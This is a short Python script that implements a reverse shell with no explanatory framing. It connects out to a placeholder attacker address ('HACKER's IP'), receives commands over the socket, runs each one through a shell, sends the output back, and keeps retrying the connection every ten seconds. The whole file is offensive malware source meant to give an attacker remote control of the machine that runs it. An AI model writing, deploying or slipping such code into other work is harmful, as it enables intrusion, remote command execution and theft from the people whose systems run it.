import socket
import subprocess
import os
import time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("HACKER's IP", "PORT"))

    current_dir = os.getcwd()

    while True:
        command = s.recv(1024).decode("utf-8")

        if command.lower() == "exit":
            break
        
        if command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(path)
                current_dir = os.getcwd()
                s.send(f"Directory changed to: {current_dir}\n".encode("utf-8"))
            except FileNotFoundError:
                s.send("Directory not found. \n".encode("utf-8"))
            continue

        output = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_dir)
        s.send((output.stdout + output.stderr).encode("utf-8"))

    s.close()

while True:
    try:
        connect()
        break
    except Exception as e:
        time.sleep(10)
        continue
